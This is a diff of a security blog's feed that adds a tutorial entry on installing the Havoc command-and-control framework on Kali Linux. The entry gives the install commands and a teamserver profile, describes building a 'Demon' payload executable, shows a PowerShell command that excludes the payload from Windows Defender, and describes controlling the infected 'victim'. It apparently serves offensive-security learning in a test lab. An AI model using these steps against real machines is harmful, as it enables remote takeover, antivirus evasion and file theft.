@@ -3,12 +3,119 @@
     <title>Cibersec and hacking blog</title>
     <link href="https://b4shnhawx.github.io/feed.xml" rel="self" />
     <link href="https://b4shnhawx.github.io" />
-    <updated>2024-08-23T13:39:12+02:00</updated>
+    <updated>2024-12-31T19:04:47+01:00</updated>
     <author>
         <name>b4shnhawx</name>
     </author>
     <id>https://b4shnhawx.github.io</id>
 
+    <entry>
+        <title>Creating C2 with HAVOC in Kali Linux</title>
+        <author>
+            <name>b4shnhawx</name>
+        </author>
+        <link href="https://b4shnhawx.github.io/creating-c2-with-havoc-in-kali-linux.html"/>
+        <id>https://b4shnhawx.github.io/creating-c2-with-havoc-in-kali-linux.html</id>
+        <media:content url="https://b4shnhawx.github.io/media/posts/16/preview.png" medium="image" />
+            <category term="os"/>
+            <category term="offensive"/>
+            <category term="linux"/>
+            <category term="hacking"/>
+
+        <updated>2024-12-31T16:26:31+01:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://b4shnhawx.github.io/media/posts/16/preview.png" alt="" />
+                    You may have heard that ‘bad guys can connect to your computer to do bad things’, but how and why? There are actually many ways to infect&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://b4shnhawx.github.io/media/posts/16/preview.png" class="type:primaryImage" alt="" /></p>
+                <p>You may have heard that ‘bad guys can connect to your computer to do bad things’, but how and why?<br><br></p>
+<h3><strong>INTRODUCING TO HAVOC C2</strong></h3>
+<hr class="line">
+<p>There are actually many ways to infect a computer and get the bad guys to connect, but one of the favourite ways for cybercriminals is to make use of command and control servers (C2 or C&amp;C for friends). These servers act as the central node of a network of infected computers so that they can easily manage them all at once and send commands to the computers (called zombie computers).<br><br></p>
+<p>Through an agent with a payload that has been installed on the computer (either by the user or by the attacker himself), the infected computer connects to the server and waits to receive commands to perform actions as we would do with a reverse shell. <br>The difference is that with a C2 server we can send commands to tens, hundreds or thousands of computers at the same time. Perfect for DDoS attacks, isn't it?<br><br></p>
+<div style="text-align: center;"><figure class="post__image"><img loading="lazy"  style="width: auto; height: auto;" src="https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/c2c_infra.png" alt="Command example" data-is-external-image="true"></figure></div>
+<p>Next we will see how to configure a Kali Linux as C2 with Havoc.<br><br></p>
+<h3><strong>INSTALLING HAVOC</strong></h3>
+<hr class="line">
+<p>First of all, update the repositories and install Havoc.<br><br></p>
+<pre class="language-bash"><code>sudo apt update -y &amp;&amp; sudo apt upgrade -y
+sudo apt get install havoc</code></pre>
+<h3><strong><br>HAVOC SERVER - CONFIGU</strong><strong>RING THE TEAM SERVER</strong></h3>
+<hr class="line">
+<p> </p>
+<p>Now we will move to the Havoc directory and create a new profile in which we will customise:</p>
+<ul>
+<li>Port (we can leave it as default: 40056)</li>
+<li>User</li>
+<li>Password</li>
+</ul>
+<pre class="language-bash"><code>cd /usr/share/havoc
+cp ./profiles/havoc.yaotl ./profiles/c2test.yaotl
+nano ./profiles/c2test.yaotl</code></pre>
+<pre class="language-bash"><code>Teamserver {
+    Host = "0.0.0.0"
+    Port = XXXXX
+
+    Build {
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
+        Nasm = "/usr/bin/nasm"
+    }
+}
+
+Operators {
+    user "USER" {
+        Password = "PASSWORD"
+    }
+}
+
+# this is optional. if you dont use it you can remove it.
+Service {
+    Endpoint = "service-endpoint"
+    Password = "service-password"
+}
+
+Demon {
+    Sleep = 2
+    Jitter = 15
+
+    TrustXForwardedFor = false
+
+    Injection {
+        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
+    }
+}</code></pre>
+<p>Finally, we will execute the server with our customised profile.<br><br></p>
+<pre class="language-bash"><code>havoc server --profile ./profiles/c2test.yaotl -v</code></pre>
+<div style="text-align: center;"><figure class="post__image"><img loading="lazy"  style="width: auto; height: auto;" src="https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_server.png" alt="Command example" data-is-external-image="true"></figure></div>
+<h3><strong><br></strong><strong>HAVOC CLIENT - CONNECTING TO THE TEAM SERVER</strong></h3>
+<hr class="line">
+<p>Now we must connect to the server through the client. This will be done on the same machine, but the client will be able to connect to the server from any other machine as long as it is configured.</p>
+<p>If we want the C2 to work over the internet we must set the public IP of the C2 server.<br><br></p>
+<pre class="language-bash"><code>havoc client</code></pre>
+<p> </p>
+<div style="text-align: center;"><figure class="post__image"><img loading="lazy"  style="width: auto; height: auto;" src="https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_client.png" alt="Command example" data-is-external-image="true"></figure></div>
+<p>When we connect to the server, the GUI will open where we will work.<br><br></p>
+<div style="text-align: center;"><figure class="post__image"><img loading="lazy"  style="width: auto; height: auto;" src="https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_client_gui.png" alt="Command example" data-is-external-image="true"></figure></div>
+<p>The first step here is to create a listener. To do this, we will go to <em>View → Listeners → Add</em>.<br><br></p>
+<figure class="post__image"><img loading="lazy"  style="width: auto; height: auto;" src="https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_listener.png" alt="Command example" data-is-external-image="true"></figure>
+<p>Now we will create a payload with which we will make the victim connect to our C2 server. To do this we must go to the menu <em>Attack → Payload</em>, and in my case I will create an executable with the listener that we just created.<br><br>It is normal that during the process, the CPU usage is kept at 100%, as it is compiling all the payload content.<br><br></p>
+<figure class="post__image"><img loading="lazy"  style="width: auto; height: auto;" src="https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_payload.png" alt="Command example" data-is-external-image="true"></figure>
+<h3><strong>INFECTING THE VICTIM</strong></h3>
+<hr class="line">
+<p>Finally, we will reproduce a real attack by running the executable on the victim machine.<br>In a normal environment, the antivirus SHOULD stop the executable (if it doesn't, change the antivirus or update it), so we will have to save a folder for the test.<br><br>To use the exception in Windows Defender, simply run the following command in a powershell with elevated permissions.<br><br></p>
+<pre class="language-bash"><code>Add-MpPreference -ExclusionPath "C:\Users\USER\Downloads\demon.https.x64.exe"</code></pre>
+<p><br>When we run it on the victim we will see how the machine information appears in Havoc.<br><br></p>
+<figure class="post__image post__image--wide"><img loading="lazy"  style="width: auto; height: auto;" src="https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_infected.png" alt="Command example" data-is-external-image="true"></figure>
+<figure class="post__image post__image--wide">From here, we can interact with the victim to execute commands, view files and even download them.<br><br><img loading="lazy"  style="width: auto; height: auto;" src="https://raw.githubusercontent.com/b4shnhawx/b4shnhawx.github.io/refs/heads/main/media/images/havoc_interact.png" alt="Command example" data-is-external-image="true"></figure><br><br></p>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>Securing Termux with fingerprint</title>
         <author>
